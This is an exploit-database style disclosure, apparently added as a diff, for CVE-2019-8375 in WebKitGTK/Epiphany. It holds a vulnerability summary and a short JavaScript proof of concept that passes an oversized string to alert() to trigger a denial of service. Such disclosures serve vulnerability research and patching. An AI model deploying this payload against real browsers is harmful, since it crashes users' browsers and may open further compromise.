@@ -1,0 +1,31 @@
+#Exploit Title: Buffer overflow
+# Date: 27-02-2019
+# Exploit Author: Dhiraj Mishra
+# Vendor Homepage: https://webkit.org/
+# Software Link: https://gitlab.gnome.org/GNOME/epiphany
+# Version: 2.23.90
+# Tested on: Linux 4.15.0-38-generic
+# CVE: CVE-2019-8375
+# References:
+# https://nvd.nist.gov/vuln/detail/CVE-2019-8375
+# https://www.inputzero.io/2019/02/fuzzing-webkit.html
+
+## Summary:
+The UIProcess subsystem in WebKit, as used in WebKitGTK through 2.23.90 and
+WebKitGTK+ through 2.22.6 and other products, does not prevent the script
+dialog size from exceeding the web view size, which allows remote attackers
+to cause a denial of service (Buffer Overflow) or possibly have unspecified
+other impact, related to UIProcess/API/gtk/WebKitScriptDialogGtk.cpp,
+UIProcess/API/gtk/WebKitScriptDialogImpl.cpp, and
+UIProcess/API/gtk/WebKitWebViewGtk.cpp, as demonstrated by GNOME Web (aka
+Epiphany).
+
+## PoC:
+<script>
+   var a = '';
+   for (var i = 1; i <= 5000; i++)
+    {
+       a += 'A';
+    }
+   alert(a);
+</script>
